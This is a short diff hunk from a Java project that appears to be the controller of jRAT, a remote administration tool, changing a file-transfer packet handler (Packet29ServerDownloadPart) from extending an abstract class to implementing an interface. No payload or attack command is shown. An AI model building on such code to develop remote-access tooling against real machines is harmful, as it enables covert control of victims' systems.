@@ -7,7 +7,7 @@ import jrat.controller.ui.panels.PanelFileTransfers;
 
 import java.io.File;
 
-public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
+public class Packet29ServerDownloadPart implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
